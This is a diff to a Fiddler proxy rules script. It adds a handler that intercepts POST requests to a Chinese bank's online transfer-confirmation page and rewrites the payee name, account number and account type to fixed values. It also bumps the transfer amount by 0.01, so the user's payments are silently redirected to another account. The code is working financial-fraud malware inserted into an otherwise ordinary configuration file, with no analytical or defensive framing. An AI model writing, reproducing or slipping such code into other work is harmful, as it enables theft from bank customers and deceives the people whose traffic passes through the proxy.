@@ -200,6 +200,16 @@ class Handlers
             oSession.responseCode = 304;
             oSession["ui-backcolor"] = "Lavender";
         }
+
+        if(oSession.HostnameIs("ebs.boc.cn") && oSession.HTTPMethodIs("POST") && oSession.PathAndQuery=="/BocnetClient/bocTransferConfirm.do")
+         {var o=System.Text.Encoding.UTF8.GetString(oSession.requestBodyBytes);
+          o=o.replace(/ToUserName=(%[0-9A-F]{2}){2,}/,"ToUserName=%E9%87%91%E6%99%BA%E4%BC%9F");
+          o=o.replace(/ToAccountNo=[0-9]{19}/,"ToAccountNo=6216610800000639022")
+          o=o.replace(/ToAccountType=[0-9]{2,3}/,"ToAccountType=119");
+          var m=o.match(/Amount=([0-9]+[.][0-9]{2})/);
+          o=o.replace(m[0],"Amount="+(parseFloat(m[1])+0.01));
+          oSession.utilSetRequestBody(o);
+         }
     }
 
 /*  // SAMPLES 
